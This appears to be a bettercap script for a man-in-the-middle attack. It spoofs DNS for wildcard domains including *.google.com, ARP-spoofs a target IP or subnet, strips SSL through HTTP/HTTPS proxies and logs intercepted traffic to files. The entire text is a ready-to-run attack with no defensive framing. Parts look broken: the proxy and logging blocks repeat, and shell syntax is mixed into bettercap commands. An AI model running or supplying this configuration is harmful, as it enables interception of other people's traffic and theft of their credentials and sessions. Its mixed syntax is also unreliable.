
# === DNS Spoofing (Fake DNS Server) ===
set dns.spoof.domains *.example.com, *.google.com  # Domains to spoof
set dns.spoof.address 192.168.1.100  # Your IP
dns.spoof on

# === HTTP/HTTPS Proxy (Intercept Traffic) ===
set http.proxy.sslstrip true
set http.proxy.port 8080
set https.proxy.port 8081
http.proxy on
https.proxy on


set any.proxy.port 80
any.proxy on

# === Logging ===
set http.proxy.log.path /tmp/http.log
set https.proxy.log.path /tmp/https.log
http.proxy.log on
https.proxy.log on

# === Events and Monitoring ===
events.stream on

set arp.spoof.fullduplex true
set arp.spoof.targets ${TARGET_IP} # Replace with target IP (e.g., 192.168.1.100) or subnet (192.168.1.0/24)
net.probe on
net.recon on

# Start ARP spoofing to intercept traffic
arp.spoof on

# Enable the HTTP/HTTPS proxy to intercept traffic
set http.proxy.sslstrip true
set http.proxy.port 8080
set https.proxy.port 8081
http.proxy on
https.proxy on

# Log all traffic to a file
set http.proxy.log.path /tmp/http_traffic.log
set https.proxy.log.path /tmp/https_traffic.log
http.proxy.log on
https.proxy.log on

# Enable verbose logging
LOG_FILE="bettercap_log.log"
events.stream on
logs verbosity 4 | tee "$LOG_FILE"


